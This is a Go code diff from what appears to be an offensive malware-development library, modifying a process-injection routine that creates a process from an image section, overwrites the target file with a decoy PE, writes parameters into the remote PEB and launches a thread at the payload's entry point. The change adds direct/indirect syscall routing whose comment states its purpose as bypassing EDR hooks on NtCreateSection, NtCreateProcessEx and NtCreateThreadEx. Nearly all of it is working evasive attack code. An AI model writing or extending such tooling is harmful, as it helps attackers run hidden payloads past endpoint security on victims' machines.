@@ -12,6 +12,7 @@ import (
 	"golang.org/x/sys/windows"
 
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
 // Windows constants not in x/sys/windows.
@@ -35,6 +36,23 @@ type Config struct {
 	// DecoyPath is the path to a legitimate PE used to overwrite the target.
 	// If empty, the target is overwritten with random bytes.
 	DecoyPath string
+
+	// Caller routes NT syscalls through direct/indirect methods to bypass
+	// EDR hooks on NtCreateSection, NtCreateProcessEx, NtCreateThreadEx, etc.
+	// nil = standard WinAPI (LazyProc.Call).
+	Caller *wsyscall.Caller
+}
+
+// ntCall routes a call through the Caller if set, otherwise via api.ProcXxx.Call.
+func ntCall(caller *wsyscall.Caller, name string, proc *windows.LazyProc, args ...uintptr) (uintptr, error) {
+	if caller != nil {
+		return caller.Call(name, args...)
+	}
+	r, _, _ := proc.Call(args...)
+	if r != 0 {
+		return r, fmt.Errorf("%s: NTSTATUS 0x%08X", name, uint32(r))
+	}
+	return 0, nil
 }
 
 // processBasicInfo mirrors PROCESS_BASIC_INFORMATION.
@@ -141,7 +159,7 @@ func Run(cfg Config) error {
 
 	// Step 2: Create image section from the file
 	var hSection windows.Handle
-	r, _, _ := api.ProcNtCreateSection.Call(
+	r, err := ntCall(cfg.Caller, "NtCreateSection", api.ProcNtCreateSection,
 		uintptr(unsafe.Pointer(&hSection)),
 		sectionAllAccess,
 		0, // no object attributes
@@ -151,13 +169,13 @@ func Run(cfg Config) error {
 		uintptr(hFile),
 	)
 	if r != 0 {
-		return fmt.Errorf("NtCreateSection: NTSTATUS 0x%08X", uint32(r))
+		return fmt.Errorf("NtCreateSection: %w", err)
 	}
 	defer windows.CloseHandle(hSection)
 
 	// Step 3: Create process from the section
 	var hProcess windows.Handle
-	r, _, _ = api.ProcNtCreateProcessEx.Call(
+	r, err = ntCall(cfg.Caller, "NtCreateProcessEx", api.ProcNtCreateProcessEx,
 		uintptr(unsafe.Pointer(&hProcess)),
 		windows.PROCESS_ALL_ACCESS,
 		0, // no object attributes
@@ -169,7 +187,7 @@ func Run(cfg Config) error {
 		0, // don't inherit handles
 	)
 	if r != 0 {
-		return fmt.Errorf("NtCreateProcessEx: NTSTATUS 0x%08X", uint32(r))
+		return fmt.Errorf("NtCreateProcessEx: %w", err)
 	}
 	defer windows.CloseHandle(hProcess)
 
@@ -197,18 +215,18 @@ func Run(cfg Config) error {
 	windows.FlushFileBuffers(hFile)
 
 	// Step 5: Set up process parameters
-	if err := setupProcessParameters(hProcess, targetPath); err != nil {
+	if err := setupProcessParameters(hProcess, targetPath, cfg.Caller); err != nil {
 		return fmt.Errorf("setup params: %w", err)
 	}
 
 	// Step 6: Get the entry point and create the initial thread
-	entryPoint, err := getEntryPoint(hProcess, payload)
+	entryPoint, err := getEntryPoint(hProcess, payload, cfg.Caller)
 	if err != nil {
 		return fmt.Errorf("get entry point: %w", err)
 	}
 
 	var hThread windows.Handle
-	r, _, _ = api.ProcNtCreateThreadEx.Call(
+	r, err = ntCall(cfg.Caller, "NtCreateThreadEx", api.ProcNtCreateThreadEx,
 		uintptr(unsafe.Pointer(&hThread)),
 		api.ThreadAllAccess,
 		0,
@@ -219,7 +237,7 @@ func Run(cfg Config) error {
 		0, 0, 0, 0,
 	)
 	if r != 0 {
-		return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%08X", uint32(r))
+		return fmt.Errorf("NtCreateThreadEx: %w", err)
 	}
 	windows.CloseHandle(hThread)
 
@@ -228,7 +246,7 @@ func Run(cfg Config) error {
 
 // setupProcessParameters creates RTL_USER_PROCESS_PARAMETERS and writes
 // them to the target process PEB.
-func setupProcessParameters(hProcess windows.Handle, imagePath string) error {
+func setupProcessParameters(hProcess windows.Handle, imagePath string, caller *wsyscall.Caller) error {
 	imagePathW, err := windows.UTF16PtrFromString(imagePath)
 	if err != nil {
 		return fmt.Errorf("utf16 image path: %w", err)
@@ -263,7 +281,7 @@ func setupProcessParameters(hProcess windows.Handle, imagePath string) error {
 	// Get PEB address from target process
 	var pbi processBasicInfo
 	var retLen uint32
-	r, _, _ = api.ProcNtQueryInformationProcess.Call(
+	r, err = ntCall(caller, "NtQueryInformationProcess", api.ProcNtQueryInformationProcess,
 		uintptr(hProcess),
 		processBasicInformation,
 		uintptr(unsafe.Pointer(&pbi)),
@@ -271,7 +289,7 @@ func setupProcessParameters(hProcess windows.Handle, imagePath string) error {
 		uintptr(unsafe.Pointer(&retLen)),
 	)
 	if r != 0 {
-		return fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%08X", uint32(r))
+		return fmt.Errorf("NtQueryInformationProcess: %w", err)
 	}
 
 	// ProcessParameters pointer offset in PEB (offset 0x20 on x64)
@@ -283,7 +301,7 @@ func setupProcessParameters(hProcess windows.Handle, imagePath string) error {
 
 	// Allocate memory in target process for the parameters
 	var remoteParams uintptr
-	r, _, _ = api.ProcNtAllocateVirtualMemory.Call(
+	r, err = ntCall(caller, "NtAllocateVirtualMemory", api.ProcNtAllocateVirtualMemory,
 		uintptr(hProcess),
 		uintptr(unsafe.Pointer(&remoteParams)),
 		0,
@@ -292,7 +310,7 @@ func setupProcessParameters(hProcess windows.Handle, imagePath string) error {
 		windows.PAGE_READWRITE,
 	)
 	if r != 0 {
-		return fmt.Errorf("NtAllocateVirtualMemory (params): NTSTATUS 0x%08X", uint32(r))
+		return fmt.Errorf("NtAllocateVirtualMemory (params): %w", err)
 	}
 
 	// Write parameters to remote process
@@ -323,11 +341,11 @@ func setupProcessParameters(hProcess windows.Handle, imagePath string) error {
 
 // getEntryPoint reads the PE headers from the payload to find the entry point,
 // then adds the process image base to get the absolute address.
-func getEntryPoint(hProcess windows.Handle, payload []byte) (uintptr, error) {
+func getEntryPoint(hProcess windows.Handle, payload []byte, caller *wsyscall.Caller) (uintptr, error) {
 	// Get the image base from the process PEB
 	var pbi processBasicInfo
 	var retLen uint32
-	r, _, _ := api.ProcNtQueryInformationProcess.Call(
+	r, err := ntCall(caller, "NtQueryInformationProcess", api.ProcNtQueryInformationProcess,
 		uintptr(hProcess),
 		processBasicInformation,
 		uintptr(unsafe.Pointer(&pbi)),
@@ -335,7 +353,7 @@ func getEntryPoint(hProcess windows.Handle, payload []byte) (uintptr, error) {
 		uintptr(unsafe.Pointer(&retLen)),
 	)
 	if r != 0 {
-		return 0, fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%08X", uint32(r))
+		return 0, fmt.Errorf("NtQueryInformationProcess: %w", err)
 	}
 
 	// Read ImageBaseAddress from PEB (offset 0x10 on x64)
